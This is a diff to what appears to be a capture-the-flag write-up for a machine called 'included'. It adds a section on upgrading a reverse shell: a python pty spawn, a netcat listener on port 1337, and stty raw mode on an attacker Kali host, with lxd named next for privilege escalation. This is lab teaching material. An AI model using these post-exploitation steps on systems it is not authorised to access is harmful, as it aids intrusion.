@@ -15,5 +15,15 @@ mike@included:~$ sudo -l
 [sudo] password for mike: 
 Sorry, user mike may not run sudo on included.
 ```
+# Upgrading the shell
+```
+mike@included:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+mike@included:/dev/shm$ ^Z
+zsh: suspended  nc -lvnp 1337                                                                       
+┌──(kali㉿kali)-[/usr/share/webshells/php]
+└─$ stty raw -echo; fg
+[1]  + continued  nc -lvnp 1337
+                               stty size;export TERM=xterm-256color
 
+```
 Time to look at lxd.
